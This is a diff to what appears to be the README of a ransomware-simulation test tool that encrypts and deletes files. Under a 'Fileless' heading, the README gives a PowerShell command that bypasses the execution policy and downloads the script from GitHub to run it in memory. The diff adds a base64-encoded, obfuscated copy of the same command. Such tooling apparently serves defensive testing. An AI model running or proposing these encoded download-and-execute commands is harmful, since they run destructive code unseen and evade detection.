@@ -55,6 +55,7 @@ EncryptDelTestv4.1.ps1
 Fileless
 - (download and run in memory directly) 
 - powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/eddiechu/Encrypt-Delete-Test/main/EncryptDelTestv4.1.ps1.txt')"
+- powershell.exe -exec Bypass -noexit -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AZQBkAGQAaQBlAGMAaAB1AC8ARQBuAGMAcgB5AHAAdAAtAEQAZQBsAGUAdABlAC0AVABlAHMAdAAvAG0AYQBpAG4ALwBFAG4AYwByAHkAcAB0AEQAZQBsAFQAZQBzAHQAdgA0AC4AMQAuAHAAcwAxAC4AdAB4AHQAJwApAA==
 
 
 EncryptDelTestv4.1.dll
